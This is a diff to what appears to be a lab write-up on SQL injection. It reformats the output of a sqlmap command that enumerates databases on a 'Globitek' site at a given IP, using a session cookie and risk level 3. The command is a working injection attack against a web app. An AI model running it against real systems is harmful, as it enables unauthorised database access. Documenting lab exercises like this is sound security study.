@@ -76,13 +76,13 @@ Using sqlmap with the following query I got a list of all the databases:
 sqlmap -u "https://35.226.85.132/blue/public/salesperson.php?id=1" --dbs --cookie="PHPSESSID=l5dhhrk5qand8l3npuml7drgg5" --threads 5 --risk 3 --time-sec 5
 ```
 available databases [7]:
-[*] globitek_blue
-[*] globitek_green
-[*] globitek_red
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] sys
+* globitek_blue
+* globitek_green
+* globitek_red
+* information_schema
+* mysql
+* performance_schema
+* sys
 
 I then used the following to get a listing of all the tables in globitek_blue:
 ```
